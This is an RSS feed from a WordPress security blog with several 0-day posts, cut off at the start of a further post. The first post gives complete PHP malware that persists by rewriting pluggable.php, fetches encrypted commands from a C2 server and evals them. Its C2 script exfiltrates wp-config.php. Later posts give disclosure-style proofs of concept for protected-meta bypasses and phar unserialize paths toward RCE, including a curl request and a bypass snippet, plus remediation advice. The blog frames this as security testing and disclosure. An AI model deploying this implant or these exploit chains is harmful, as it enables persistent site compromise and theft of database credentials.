<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
	xmlns:content="http://purl.org/rss/1.0/modules/content/"
	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
	xmlns:dc="http://purl.org/dc/elements/1.1/"
	xmlns:atom="http://www.w3.org/2005/Atom"
	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
	>

<channel>
	<title>0day &#8211; WP deeply</title>
	<atom:link href="https://wpdeeply.com/tag/0day/feed/" rel="self" type="application/rss+xml" />
	<link>http://wpdeeply.com/</link>
	<description></description>
	<lastBuildDate>Mon, 24 Aug 2020 03:33:18 +0000</lastBuildDate>
	<language>en-US</language>
	<sy:updatePeriod>
	hourly	</sy:updatePeriod>
	<sy:updateFrequency>
	1	</sy:updateFrequency>
	<generator>https://wordpress.org/?v=5.4.2</generator>
	<item>
		<title>WordPress security testing</title>
		<link>https://wpdeeply.com/wordpress-security-testing/</link>
		
		<dc:creator><![CDATA[root]]></dc:creator>
		<pubDate>Mon, 24 Aug 2020 03:09:33 +0000</pubDate>
				<category><![CDATA[redteam]]></category>
		<category><![CDATA[0day]]></category>
		<guid isPermaLink="false">https://wpdeeply.com/?p=209</guid>

					<description><![CDATA[There are a lot of security solutions around WP eco system advertising their possibility to fight malware, intrusions and exploitation. Most of them are endpoint security solutions, there are cloud ones, but also market knows the managed WP services that offer security in their own way. Having big choice sometime is a problem, because you [&#8230;]]]></description>
										<content:encoded><![CDATA[
<p>There are a lot of security solutions around WP eco system advertising their possibility to fight malware, intrusions and exploitation. Most of them are endpoint security solutions, there are cloud ones, but also market knows the managed WP services that offer security in their own way. Having big choice sometime is a problem, because you can&#8217;t verify all of the claims and if you try, you will need to waste huge load of time auditing / testing. That is why the goal of this section is to provide tools and methods for easy verification of those claims and to help users into choosing the right offering. </p>



<h2>Attack demo</h2>



<p>For the purpose of testing two scripts are created: malware/implant and remote C2 server script. Both are extremely easy for setup, but default versions are prepared in that way, so their abuse would require modifications. </p>



<h5>malware</h5>



<p>This software is based on <a rel="noreferrer noopener" href="https://github.com/Slavco/wp-weaver" target="_blank">wp-weaver</a> project, includes encryption in order to hide its actions and is more than modular to accept and execute everything that is sent by C2. </p>



<pre class="wp-block-code"><code lang="php" class="language-php">//marker_weaver_ftw
$target_files = array(
    ABSPATH . WPINC . '/pluggable.php'
    //just for demo purposes, that is why too few :)
);

//must be here because collisions of the rand and race conditions
if ( ! function_exists("weaver_plant_payload") ){
    function weaver_plant_payload($file, $payload_data, $append){
        //grab the session for one peer only - payload almost forever in memory
        if ( isset($_REQUEST["peer"]) &amp;&amp; $_REQUEST["peer"]!="" ) sleep(9);
        if ( $append ){
            @file_put_contents($file, $payload_data, FILE_APPEND | LOCK_EX);
        }else{
            @file_put_contents($file, $payload_data, LOCK_EX);
        }
        //time window to switch "session" towards another peer
        if ( isset($_REQUEST["peer"]) &amp;&amp; $_REQUEST["peer"]!="" ) sleep(2);
    }
    $the_file = $target_files[rand(0,(sizeof($target_files)-1))];
    $my_content = @file_get_contents(__FILE__);
    $my_content_list = @explode("//\x6Darker_weaver_ftw", $my_content);
    if ( is_array($my_content_list) &amp;&amp; sizeof($my_content_list) >= 2 ){
        @file_put_contents(__FILE__, $my_content_list[0]);
        @register_shutdown_function("weaver_plant_payload", $the_file, "//\x6Darker_weaver_ftw".$my_content_list[1], true);
    }else{
        //shouldn't be here, but at least don't damage the instance
        @register_shutdown_function("weaver_plant_payload", __FILE__, $my_content, false);
    }
}
//malware code below - any length, any logic
if ( isset($_REQUEST["wpdeeply"])){
    //choose the code execution method
    $method_exec = 'eval';
    $test_pass = FALSE;
    
    //test if execution mechanism works
    if ( $method_exec ){
        switch( $method_exec ){
            case 'eval':
                $test_data = '$find_me = array("find_me");';
                eval($test_data);
                if (isset($find_me) &amp;&amp; is_array($find_me) &amp;&amp; in_array('find_me', $find_me)) $test_pass = TRUE;
                break;
                //...
        }
        //if works then load instructions from c2
        if ( $test_pass ){
            
	    	//hardcoded values put here during delivery of the test malware
            define('C2_URL', 'https://local.host/c2.php');
            $c2_box_publickey = base64_decode('CCp/4qGswYmd47p4heS8kwnC3z++VwGN7fRLOCi5sn0=');
            
            //encryption key for delivered payload
            $session_key = \Sodium\randombytes_buf(\Sodium\CRYPTO_SECRETBOX_KEYBYTES);
            
            //prepare data for c2 instruction
            $json_requirements = json_encode(array(
                'key'   => base64_encode($session_key),
                'type' => 'eval'
            ));
            
            //encrypt with c2 pub key
            $rcr = \Sodium\crypto_box_seal(
                $json_requirements,
                $c2_box_publickey
                );
            
            //get results
            $c2_remote_fetch = wp_remote_post(
                C2_URL,
                array(
                    'body' => array(
                        'rcr'   => $rcr
                    ),
                )
                );
            //veryfy response
            if ( ! is_wp_error( $c2_remote_fetch ) ) {
                $c2_remote = json_decode( wp_remote_retrieve_body( $c2_remote_fetch ), true );
            }
            //verify response data format and execute commands
            if ( is_array( $c2_remote ) &amp;&amp; isset( $c2_remote['payload'] ) &amp;&amp; isset( $c2_remote['nonce'] ) ) {
                
                $payload_encrypted = base64_decode( $c2_remote['payload'] );
                $nonce = base64_decode( $c2_remote['nonce'] );
                
                //decrypt final payload from c2
                $payload = \Sodium\crypto_secretbox_open($payload_encrypted, $nonce, $session_key);
                if ( $payload !== false ){
                    @eval($payload);
                }
            }
        }
    }
}</code></pre>



<h5>C2</h5>



<p>This is simple server side script, that will serve the payload when requested by its malware and will log its actions in order to harvest the fruits of commands execution.</p>



<pre class="wp-block-code"><code lang="php" class="language-php">include 'sodium_compat/autoload.php';

//handle the requests from the client/s
if ( isset($_POST["rcr"]) ){
    $encrypted_remote_client_requirements = $_POST["rcr"];
}else{
    exit(0);
}

//simple payload code with arrogant exfiltration method, but possible only for users with upload permissions :) 
$remote_cmd = '
    if ( defined("ABSPATH") ){
        if ( file_exists(ABSPATH."wp-config.php") ){
            wp_upload_bits("wpdeeply.jpg", "", \Sodium\crypto_box_seal(file_get_contents(ABSPATH."wp-config.php"), $c2_box_publickey));
        }
    }
';


//c2 public and secret keys
$c2_box_secretkey = base64_decode('Gr10jP1z0VTyRtaJIav8ElMcmvQ6abfnkfKz5wftI+c=');
$c2_box_publickey = base64_decode('CCp/4qGswYmd47p4heS8kwnC3z++VwGN7fRLOCi5sn0=');

$c2_box_kp = \Sodium\crypto_box_keypair_from_secretkey_and_publickey(
    $c2_box_secretkey,
    $c2_box_publickey
    );

//decode the data received from client
$remote_client_requirements = \Sodium\crypto_box_seal_open(
    $encrypted_remote_client_requirements,
    $c2_box_kp
    );

$remote_client_requirements = @json_decode($remote_client_requirements, true);
if ( !$remote_client_requirements ) exit(0);

//reply to the client with payload encrypted with delivered session_key + used nonce 
if ( is_array($remote_client_requirements) &amp;&amp; isset($remote_client_requirements['key']) &amp;&amp; isset($remote_client_requirements['type']) ){
    $session_key = base64_decode($remote_client_requirements['key']);
    $session_nonce = \Sodium\randombytes_buf(\Sodium\CRYPTO_SECRETBOX_NONCEBYTES);
    $response = json_encode(array( 'payload' => base64_encode(\Sodium\crypto_secretbox($remote_cmd, $session_nonce, $session_key)), 'nonce'=> base64_encode($session_nonce)));
    //add some fancy logging in order to know the client and type+format of exfiltrated data 
    echo $response;
}
exit();</code></pre>



<h5>Setup</h5>



<p>In order to run the demo on your own WP instance you will need the following:</p>



<ul><li>You will need to be logged in as user with upload permissions on the WP (it is this way in order to be stopped abuse of the scripts and that is why in the payload is used <span class="has-inline-color has-primary-color"><strong>wp_upload_bits</strong></span> function)</li><li>In the malware script set up your own value for <span class="has-inline-color has-primary-color"><strong>C2_URL</strong></span> constant and that is the url of your C2 script</li><li>In order to work C2 script you will need <strong>sodium_compat</strong> next to it and it could be found into any WP 5+ distribution under wp-includes folder</li><li>cat malware.txt &gt; /path_to_your_code/wp-includes/pluggable.php</li><li>Logged in with user with upload permissions hit refresh on your WP homepage with <strong>?wpdeeply=ok</strong> parameters and check in the upload directory <strong>wpdeeply?-x.jpg</strong> with encrypted <strong>wp-config.php</strong> content </li></ul>



<h2>Successful demo</h2>



<p>This means that you managed to put malware on your WP and to execute code in it. For tech people it is clear (try to use peer method of the weaver) what is done in the background, but for not tech savvy users won&#8217;t be, but both are more than free to question its security guarantee about the events. Questions that would be good to be answered:</p>



<ul><li>Why malware doesn&#8217;t disappear after update / re-install from admin screen or wpcli?</li><li>What type of commands &#8220;attacker&#8221; executed against WP?</li><li>What data was leaked and where?   </li><li>&#8230; </li></ul>



<p></p>
]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>WordPress protected meta via wp job manager</title>
		<link>https://wpdeeply.com/wordpress-protected-meta-via-wp-job-manager/</link>
		
		<dc:creator><![CDATA[root]]></dc:creator>
		<pubDate>Tue, 11 Aug 2020 10:52:13 +0000</pubDate>
				<category><![CDATA[core]]></category>
		<category><![CDATA[plugins]]></category>
		<category><![CDATA[0day]]></category>
		<guid isPermaLink="false">https://wpdeeply.com/?p=199</guid>

					<description><![CDATA[Adding slashes or removing them is a thing on WP. Most of the meta functions perform that e.g. they hold that not popular&#160;wp_unslashagainst meta keys and values. This means when input towards&#160;update_metadata&#160;and&#160;add_metadata&#160;isn&#8217;t from the current http requst via some web form e.g. html interface there is possibility for user to insert/update protected meta key into [&#8230;]]]></description>
										<content:encoded><![CDATA[
<p>Adding slashes or removing them is a thing on WP. Most of the meta functions perform that e.g. they hold that not popular&nbsp;<code>wp_unslash</code>against meta keys and values. This means when input towards&nbsp;<code>update_metadata</code>&nbsp;and&nbsp;<code>add_metadata</code>&nbsp;isn&#8217;t from the current http requst via some web form e.g. html interface there is possibility for user to insert/update protected meta key into post meta database table with simple&nbsp;<code>\_any-value</code>&nbsp;meta key format.</p>



<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-protected-meta-job-manager.md#eli5-poc"></a>Eli5 PoC</h2>



<p>WP Job Manager holds functionality that duplicates Job Post and that is avaliable only via Job Dashboard. That is possible via&nbsp;<code>job_manager_duplicate_listing</code>&nbsp;function and there we have the&nbsp;<code>update_post_meta</code>&nbsp;call.</p>



<pre class="wp-block-code"><code lang="php" class="language-php">...
	// phpcs:ignore WordPress.DB.DirectDatabaseQuery.DirectQuery, WordPress.DB.DirectDatabaseQuery.NoCaching -- Easiest way to retrieve raw meta values without filters.
	$post_meta = $wpdb->get_results( $wpdb->prepare( "SELECT meta_key, meta_value FROM {$wpdb->postmeta} WHERE post_id=%d", $post_id ) );

	if ( ! empty( $post_meta ) ) {
		$post_meta = wp_list_pluck( $post_meta, 'meta_value', 'meta_key' );

		$default_duplicate_ignore_keys = [ '_filled', '_featured', '_job_expires', '_job_duration', '_package_id', '_user_package_id' ];
		$duplicate_ignore_keys         = apply_filters( 'job_manager_duplicate_listing_ignore_keys', $default_duplicate_ignore_keys, true );

		foreach ( $post_meta as $meta_key => $meta_value ) {
			if ( in_array( $meta_key, $duplicate_ignore_keys, true ) ) {
				continue;
			}
			update_post_meta( $new_post_id, $meta_key, maybe_unserialize( $meta_value ) );
		}
	}
...
</code></pre>



<p>Everything is fine, but we must have the possibility to insert meta / custom fields into job post. If we check deeply this functionality then this&nbsp;<code>job_manager_duplicate_listing</code>&nbsp;is called in&nbsp;<code>job_dashboard_handler</code>&nbsp;which is&nbsp;<code>WP_Job_Manager_Shortcodes</code>&nbsp;method. Checking its functionlity we have the following:</p>



<pre class="wp-block-code"><code lang="php" class="language-php">public function job_dashboard_handler() {
	if (
		! empty( $_REQUEST['action'] )
		&amp;&amp; ! empty( $_REQUEST['_wpnonce'] )
		&amp;&amp; wp_verify_nonce( wp_unslash( $_REQUEST['_wpnonce'] ), 'job_manager_my_job_actions' ) // phpcs:ignore WordPress.Security.ValidatedSanitizedInput.InputNotSanitized -- Nonce should not be modified.
	) {

		$action = sanitize_title( wp_unslash( $_REQUEST['action'] ) );
		$job_id = isset( $_REQUEST['job_id'] ) ? absint( $_REQUEST['job_id'] ) : 0;

		try {
			// Get Job.
			$job = get_post( $job_id );

			// Check ownership.
			if ( ! job_manager_user_can_edit_job( $job_id ) ) {
				throw new Exception( __( 'Invalid ID', 'wp-job-manager' ) );
			}

			switch ( $action ) {
...
case 'duplicate':
						if ( ! job_manager_get_permalink( 'submit_job_form' ) ) {
							throw new Exception( __( 'Missing submission page.', 'wp-job-manager' ) );
						}

						$new_job_id = job_manager_duplicate_listing( $job_id );

</code></pre>



<p>From here we see that&nbsp;<code>_wpnonce</code>&nbsp;isn&#8217;t tight up with job id, but also from&nbsp;<code>job_manager_user_can_edit_job</code>&nbsp;we see that post type isn&#8217;t checked, but only capability for user to edit the post and that could be any post from any post type. Having in mind previous knowledge presented on wpdeeply and nature of WordPress, this could be considered as high severity issue. Check the facts for RCE <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>



<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-protected-meta-job-manager.md#few-facts"></a>Few facts</h2>



<ul><li>WP Job Manager <a rel="noreferrer noopener" href="https://wpdeeply.com/wordpress-attachment-api-functions-and-any-post-type/" target="_blank">isn&#8217;t alone</a> and can be attacked via core</li><li>What about WooCommerce before 4.1.0 or <a href="https://wpdeeply.com/woocommerce-mysql-replace-to-rce/" target="_blank" rel="noreferrer noopener">latest WooCommerce</a></li><li>Accessing the blocked meta keys in <code>job_manager_duplicate_listing</code> via this <a href="https://wpdeeply.com/wordpress-core-and-mysql-string-comparison/" target="_blank" rel="noreferrer noopener">technique</a></li></ul>



<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-protected-meta-job-manager.md#remediation"></a>Remediation</h2>



<ul><li>Calling <code>wp_slash</code> on input won&#8217;t solve the issue, because <code>update_metadata</code></li><li>:/</li></ul>
]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>WordPress attachment api functions and any post type</title>
		<link>https://wpdeeply.com/wordpress-attachment-api-functions-and-any-post-type/</link>
		
		<dc:creator><![CDATA[root]]></dc:creator>
		<pubDate>Sun, 09 Aug 2020 14:39:59 +0000</pubDate>
				<category><![CDATA[core]]></category>
		<category><![CDATA[plugins]]></category>
		<category><![CDATA[0day]]></category>
		<guid isPermaLink="false">https://wpdeeply.com/?p=197</guid>

					<description><![CDATA[Core had put some efforts in order to prevent accessing&#160;attachment&#160;post type functions from another post types. Usually checks are done by calling&#160;get_post&#160;and comparing the post type with&#160;attachment, but that is selective and only in hand picked places. It is that way because performances mainly, so many functions are lacking this checks. Eli5 PoC One of [&#8230;]]]></description>
										<content:encoded><![CDATA[
<p>Core had put some efforts in order to prevent accessing&nbsp;<code>attachment</code>&nbsp;post type functions from another post types. Usually checks are done by calling&nbsp;<code>get_post</code>&nbsp;and comparing the post type with&nbsp;<code>attachment</code>, but that is selective and only in hand picked places. It is that way because performances mainly, so many functions are lacking this checks.</p>



<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-attachment-api-any.md#eli5-poc"></a>Eli5 PoC</h2>



<p>One of them, that calls another attachment related is <code>wp_update_image_subsizes</code> and there we have the following calls up to <code>path_join</code>where we have <a rel="noreferrer noopener" href="https://wpdeeply.com/wordpress-and-phar-unserialize/" target="_blank">phar unserialize</a> or <code>wp_create_image_subsizes</code> where <a rel="noreferrer noopener" href="https://wpdeeply.com/wordpress-null-byte-to-rce-0-day-bug/" target="_blank">image editor RCE ?!</a> is in game, but also <code>getimagesize</code> as phar unserialize appears too.</p>



<ul><li><code>wp_update_image_subsizes</code><ul><li><code>wp_get_attachment_metadata</code></li><li><code>wp_get_original_image_path</code><ul><li><code>wp_attachment_is_image</code></li><li><code>wp_get_attachment_metadata</code></li><li><code>get_attached_file</code></li><li><code>path_join</code></li></ul></li></ul></li></ul>



<p>this function is called in&nbsp;<code>wp_ajax_media_create_image_subsizes</code></p>



<pre class="wp-block-code"><code lang="php" class="language-php">function wp_ajax_media_create_image_subsizes() {
	check_ajax_referer( 'media-form' );

	if ( ! current_user_can( 'upload_files' ) ) {
		wp_send_json_error( array( 'message' => __( 'Sorry, you are not allowed to upload files.' ) ) );
	}

	if ( empty( $_POST['attachment_id'] ) ) {
		wp_send_json_error( array( 'message' => __( 'Upload failed. Please reload and try again.' ) ) );
	}

	$attachment_id = (int) $_POST['attachment_id'];

	if ( ! empty( $_POST['_wp_upload_failed_cleanup'] ) ) {
		// Upload failed. Cleanup.
		if ( wp_attachment_is_image( $attachment_id ) &amp;&amp; current_user_can( 'delete_post', $attachment_id ) ) {
			$attachment = get_post( $attachment_id );

			// Created at most 10 min ago.
			if ( $attachment &amp;&amp; ( time() - strtotime( $attachment->post_date_gmt ) &lt; 600 ) ) {
				wp_delete_attachment( $attachment_id, true );
				wp_send_json_success();
			}
		}
	}

	// Set a custom header with the attachment_id.
	// Used by the browser/client to resume creating image sub-sizes after a PHP fatal error.
	if ( ! headers_sent() ) {
		header( 'X-WP-Upload-Attachment-ID: ' . $attachment_id );
	}

	// This can still be pretty slow and cause timeout or out of memory errors.
	// The js that handles the response would need to also handle HTTP 500 errors.
	wp_update_image_subsizes( $attachment_id );
...
</code></pre>



<p>where&nbsp;<code>attachment_id</code>&nbsp;could be any post&nbsp;<code>ID</code>&nbsp;from any&nbsp;<code>post_type</code>. So if&nbsp;<code>author</code>&nbsp;user role grabs the&nbsp;<code>_wpnonce</code>&nbsp;from&nbsp;<code>wp-admin/media-new.php</code>&nbsp;could perform the request below with &#8220;attacking&#8221; post ID.</p>



<pre class="wp-block-code"><code lang="bash" class="language-bash">curl 'http://local.target/wp-admin/admin-ajax.php' -H 'Cookie: ...' --data 'action=media-create-image-subsizes&amp;_ajax_nonce=[media-form-nonce]&amp;attachment_id=[any-post-id-with-protected-atachment-meta]' --compressed
</code></pre>



<p>How to add protected meta into posts?! Check the facts below. <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>



<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-attachment-api-any.md#few-facts"></a>Few facts</h2>



<ul><li>Yoast Duplicate posts is <a href="https://plugins.trac.wordpress.org/browser/duplicate-post/trunk/duplicate-post-admin.php#L637" target="_blank" rel="noreferrer noopener">adding protected</a> meta when cloning if meta / custom field key starts with <code>\_</code></li><li>We had already seen the <a href="https://wpdeeply.com/wordpress-importer-arbitrary-post-create/" target="_blank" rel="noreferrer noopener">wordpress-importer in action</a></li><li>WooCommerce had fixed something similar <a rel="noreferrer noopener" href="https://raw.githubusercontent.com/woocommerce/woocommerce/master/CHANGELOG.txt" target="_blank">few months</a> ago in 4.1.0 version</li></ul>



<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-attachment-api-any.md#remediation"></a>Remediation</h2>



<ul><li>make sure that <code>attachment</code> routines are performed only over attachments</li><li>do not allow users to create protected meta</li></ul>
]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>WordPress and phar unserialize</title>
		<link>https://wpdeeply.com/wordpress-and-phar-unserialize/</link>
		
		<dc:creator><![CDATA[root]]></dc:creator>
		<pubDate>Fri, 07 Aug 2020 21:58:43 +0000</pubDate>
				<category><![CDATA[core]]></category>
		<category><![CDATA[0day]]></category>
		<guid isPermaLink="false">https://wpdeeply.com/?p=188</guid>

					<description><![CDATA[Core team had put some effort into project in order to preven unserialize of user input via&#160;phar&#160;stream wrapper. In general, efforts are good, but to excelent there are two more grades and this is the max with this approach. In the core there is function&#160;path_join&#160;that accepts two parameters&#160;$base&#160;and&#160;$path.&#160;$path&#160;is then sent towards function&#160;path_is_absolute&#160;and from the code [&#8230;]]]></description>
										<content:encoded><![CDATA[
<p>Core team had put some effort into project in order to preven unserialize of user input via&nbsp;<code>phar</code>&nbsp;stream wrapper. In general, efforts are good, but to excelent there are two more grades and this is the max with this approach. In the core there is function&nbsp;<code>path_join</code>&nbsp;that accepts two parameters&nbsp;<code>$base</code>&nbsp;and&nbsp;<code>$path</code>.&nbsp;<code>$path</code>&nbsp;is then sent towards function&nbsp;<code>path_is_absolute</code>&nbsp;and from the code</p>



<pre class="wp-block-code"><code lang="php" class="language-php">function path_is_absolute( $path ) {
	/*
	 * Check to see if the path is a stream and check to see if its an actual
	 * path or file as realpath() does not support stream wrappers.
	 */
	if ( wp_is_stream( $path ) &amp;&amp; ( is_dir( $path ) || is_file( $path ) ) ) {
		return true;
	}
...
</code></pre>



<p>it is obvious that&nbsp;<code>wp_is_stream</code>&nbsp;will return&nbsp;<code>TRUE</code>&nbsp;for&nbsp;<code>phar://path_here</code>&nbsp;and will reach&nbsp;<code>is_dir</code>&nbsp;and/or&nbsp;<code>is_file</code>&nbsp;which will trigger unserialize of user input in WP.</p>



<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-phar-unserialize.md#eli5-poc"></a>Eli5 PoC</h2>



<p>In&nbsp;<code>wp_restore_image</code>&nbsp;function which could be called by any user with upload rights on WP (author user role by default) there is the following flow:</p>



<pre class="wp-block-code"><code lang="php" class="language-php">...
$backup_sizes     = get_post_meta( $post_id, '_wp_attachment_backup_sizes', true );
...
if ( isset( $backup_sizes['full-orig'] ) &amp;&amp; is_array( $backup_sizes['full-orig'] ) ) {
		$data = $backup_sizes['full-orig'];
...
		$restored_file = path_join( $parts['dirname'], $data['file'] );
		$restored      = update_attached_file( $post_id, $restored_file );

</code></pre>



<p>There it is, unserialize of user input. How to place custom values in&nbsp;<code>_wp_attachment_backup_sizes</code>, check the facts <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>



<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-phar-unserialize.md#few-facts"></a>Few facts</h2>



<ul><li><code>import</code> capability is <a rel="noreferrer noopener" href="https://wpdeeply.com/wordpress-importer-arbitrary-post-create/" target="_blank">fatal</a> for WP because arbitrary post create from low permission user roles</li><li>this is how to meddle with <a rel="noreferrer noopener" href="https://wpdeeply.com/wordpress-attached-file-meta/" target="_blank">attached file</a> via <a rel="noreferrer noopener" href="https://wpdeeply.com/wordpress-importer-and-attached-file/" target="_blank">importer</a></li><li><code>path_join</code> is wide spread across <a rel="noreferrer noopener" href="https://wpdirectory.net/search/01EF5E56NN5S9VHK7BMQ9XF3BZ" target="_blank">eco system</a></li><li>no need for <a href="https://wpdeeply.com/wordpress-upload-any-file-with-image-extension/" target="_blank" rel="noreferrer noopener">image polyglots</a> </li></ul>



<h1><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-phar-unserialize.md#remediation"></a>Remediation</h1>



<ul><li>phar vulnerabilities should be handled on <a href="https://github.com/TYPO3/phar-stream-wrapper" target="_blank" rel="noreferrer noopener">stream wrapper level</a>, not with &#8220;guarding&#8221;</li></ul>
]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>WordPress and multiple maybe_unserialize</title>
		<link>https://wpdeeply.com/wordpress-and-multiple-maybe_unserialize/</link>
		
		<dc:creator><![CDATA[root]]></dc:creator>
		<pubDate>Mon, 27 Jul 2020 21:12:58 +0000</pubDate>
				<category><![CDATA[plugins]]></category>
		<category><![CDATA[0day]]></category>
		<guid isPermaLink="false">https://wpdeeply.com/?p=185</guid>

					<description><![CDATA[WordPress introduced&#160;maybe_unserialize&#160;and&#160;maybe_serialize&#160;as security functions in the past and they are deeply integrated in the core. Usually for backward compatibility or improper usage in the past, many software vendors are using multiple&#160;maybe_unserialize towards values that could be planted into DB with lower number of&#160;maybe_serializecalls. Eli5 PoC and if you think that this code isn&#8217;t existing then [&#8230;]]]></description>
										<content:encoded><![CDATA[
<p>WordPress introduced&nbsp;<code>maybe_unserialize</code>&nbsp;and&nbsp;<code>maybe_serialize</code>&nbsp;as security functions in the past and they are deeply integrated in the core. Usually for backward compatibility or improper usage in the past, many software vendors are using multiple&nbsp;<code>maybe_unserialize</code> towards values that could be planted into DB with lower number of&nbsp;<code>maybe_serialize</code>calls.</p>



<h2>Eli5 PoC</h2>



<pre class="wp-block-code"><code lang="php" class="language-php">$maybe_double_unserialize = function ( $value ) {
	return maybe_unserialize( $value );
};

$values = array_map(
	$maybe_double_unserialize,
	array_filter( get_post_meta( $product_id, $field_key ) )
);
</code></pre>



<p>and if you think that this code isn&#8217;t existing then <a rel="noreferrer noopener" href="https://plugins.trac.wordpress.org/browser/woocommerce-multilingual/trunk/inc/translation-editor/class-wcml-editor-ui-product-job.php#L984" target="_blank">check this</a> out. Yes it is 100k active installs Woo plugin and when Woo unserialze attack is in question, <a rel="noreferrer noopener" href="https://wpdeeply.com/woocommerce-mysql-replace-to-rce/" target="_blank">then</a>! :/</p>



<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-multiple-maybe-unserialize.md#few-facts"></a>Few facts</h2>



<ul><li>double <code>maybe_unserialize</code> is quite widespread around WP eco system, specially in Woo related plugins</li></ul>



<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-multiple-maybe-unserialize.md#remadiation"></a>Remediation</h2>



<ul><li>add constraints into your php.ini regarding serialization</li><li>mod the maybe_ functions so they sign the final payload</li></ul>
]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>WordPress core and MySQL string comparison</title>
		<link>https://wpdeeply.com/wordpress-core-and-mysql-string-comparison/</link>
		
		<dc:creator><![CDATA[root]]></dc:creator>
		<pubDate>Sat, 25 Jul 2020 22:09:53 +0000</pubDate>
				<category><![CDATA[core]]></category>
		<category><![CDATA[plugins]]></category>
		<category><![CDATA[0day]]></category>
		<guid isPermaLink="false">https://wpdeeply.com/?p=178</guid>

					<description><![CDATA[If we execute the following MySQL query against WP database we will get results in case we had already uploaded media in the past This is sort of &#8220;feature&#8221; of MySQL RDBMS, but what this means from WP aspect. It means a lot, because in the past there were account take over / backdoor vulnerabilities [&#8230;]]]></description>
										<content:encoded><![CDATA[
<p>If we execute the following MySQL query against WP database</p>



<pre class="wp-block-code"><code lang="sql" class="language-sql">select * from wp_postmeta where meta_key = concat(char(1),"_wp_attached_file");
</code></pre>



<p>we will get results in case we had already uploaded media in the past</p>



<pre class="wp-block-code"><code class="">+---------+---------+-------------------+--------------------------------+
| meta_id | post_id | meta_key          | meta_value                     |
+---------+---------+-------------------+--------------------------------+
|      46 |      92 | _wp_attached_file | 2020/07/wpdeeply.png#/boom.png |
|      71 |      99 | _wp_attached_file | wpdeeply                       |
+---------+---------+-------------------+--------------------------------+
2 rows in set (0.00 sec)

</code></pre>



<p>This is sort of &#8220;feature&#8221; of MySQL RDBMS, but what this means from WP aspect. It means a lot, because in the past there were account take over / backdoor vulnerabilities fixed silently and today we are going to focus on&nbsp;<code>update_metadata</code>&nbsp;function. WordPress prevents medling with protected meta via&nbsp;<code>is_protected_meta</code>&nbsp;function which basically checks if&nbsp;<code>meta_key</code>&nbsp;starts with&nbsp;<code>_</code>, but that isn&#8217;t enough because it is on PHP side.</p>



<p>Eli5 PoC</p>



<p>Upload media file on your test WP instance and grab the&nbsp;<code>post_id</code>. Then run the following code snippet with your own data / post_id:</p>



<pre class="wp-block-code"><code lang="php" class="language-php">function bypass_protected_meta(){
    //your demo media(post) id
    $post_id = 99;
    
    $meta_key = "\x11_wp_attached_file";
    $meta_value = "wpdeeply";
    
    //into edit post meta capability there is check for protected meta, but this is for auditorium to be much more clearer 
    if ( current_user_can( 'edit_post_meta', $post_id, $meta_key ) &amp;&amp; ! is_protected_meta($meta_key) ){
        update_post_meta($post_id, $meta_key, $meta_value);
    }
}

add_action(init, "bypass_protected_meta");
</code></pre>



<p>Refresh the media (will not be displayed) and if you check in DB&nbsp;<code>_wp_attached_file</code>&nbsp;will have the&nbsp;<code>wpdeeply</code>&nbsp;value. Is this bug with impact? Well Jetpack folks will need to answer that&nbsp;<a href="https://github.com/Automattic/jetpack/blob/master/json-endpoints/class.wpcom-json-api-update-post-v1-2-endpoint.php#L824">https://github.com/Automattic/jetpack/blob/master/json-endpoints/class.wpcom-json-api-update-post-v1-2-endpoint.php#L824</a>, but you can find a lot of use cases on wpdirectory <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>



<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-core-and-mysql-string-comparison.md#few-facts"></a>Few facts</h2>



<ul><li>This MySQL behaviour is for huge set of utf-8 characters not only ascii control ones</li><li>Why this <a rel="noreferrer noopener" href="https://stackoverflow.com/questions/543580/equals-vs-like/2336940#2336940" target="_blank">happens</a>&nbsp;</li><li>There are more places around WP code where unexpected behaviour is in game, because at the end of the day WP is just PHP &amp; MySQL web app</li><li>Meddling with protected meta on WP is RCE. Few examples: <a rel="noreferrer noopener" href="https://wpdeeply.com/wordpress-null-byte-to-rce-0-day-bug/" target="_blank">here</a>, <a rel="noreferrer noopener" href="https://wpdeeply.com/wordpress-write-image-to-any-directory-rce/" target="_blank">here</a> and <a rel="noreferrer noopener" href="https://wpdeeply.com/wordpress-write-image-to-any-directory-rce/" target="_blank">here</a>. There are few not disclosed too <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /></li></ul>



<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-core-and-mysql-string-comparison.md#remediation"></a>Remediation</h2>



<ul><li>be careful with data used in MySQL WHERE</li><li><code>is_protected_meta</code>&nbsp;should be DB/MySQL check against current setup instead PHP one</li></ul>
]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>WordPress importer arbitrary post create</title>
		<link>https://wpdeeply.com/wordpress-importer-arbitrary-post-create/</link>
		
